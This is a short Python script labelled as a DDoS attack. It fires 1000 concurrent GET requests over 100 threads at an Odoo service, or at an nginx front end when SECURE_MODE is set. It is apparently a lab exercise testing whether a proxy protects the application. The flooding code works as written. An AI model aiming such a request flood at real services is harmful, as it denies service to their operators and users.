# attack_scripts/ddos.py

import os
import requests
import logging
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
_logger = logging.getLogger(__name__)

secure_mode = os.getenv("SECURE_MODE") == "true"
url = "http://nginx:80" if secure_mode else "http://odoo:8069"

_logger.info(f'SECURE_MODE: {secure_mode}, using url: {url}')

def send_request():
    try:
        response = requests.get(url)
        _logger.info(f"url: {url}, Status Code: {response.status_code}")
    except Exception as e:
        _logger.error(f"url: {url}, Error: {e}")

# Ejecutar múltiples solicitudes simultáneas

with ThreadPoolExecutor(max_workers=100) as executor:
    # Número de solicitudes
    request_amount = 1000
    _logger.info(f'sending {request_amount} requests as ddos attack')
    for i in range(request_amount):
        no = i + 1
        _logger.info(f'sending request no.: {no}')
        executor.submit(send_request)
